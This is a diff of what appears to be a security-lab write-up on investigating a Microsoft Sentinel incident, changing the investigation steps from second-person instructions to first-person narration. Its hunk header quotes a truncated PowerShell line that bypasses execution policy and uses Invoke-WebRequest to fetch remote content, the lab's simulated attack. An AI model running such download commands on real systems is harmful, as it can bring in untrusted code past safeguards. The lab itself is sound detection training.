@@ -91,10 +91,10 @@ powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://r
 
 ### 🕵️ Investigate the Incident
 
-The simulated malicious PS script successfully triggered the Sentinel Analytics rule, the alert appears in Microsoft Sentinel under **Incidents**. Begin your investigation:
+The simulated malicious PS script successfully triggered the Sentinel Analytics rule, the alert appears in Microsoft Sentinel under **Incidents**. I began the investigation:
 
-1. Assign the incident to yourself and mark it as Active.  
-2. Review the incident details to identify affected devices, users, and commands.
+1. I Assigned the incident to myself and marked it Active.  
+2. I then reviewed the incident details to identify affected devices, users, and commands.
 
 ![Incident Overview](images/map5.png)
 
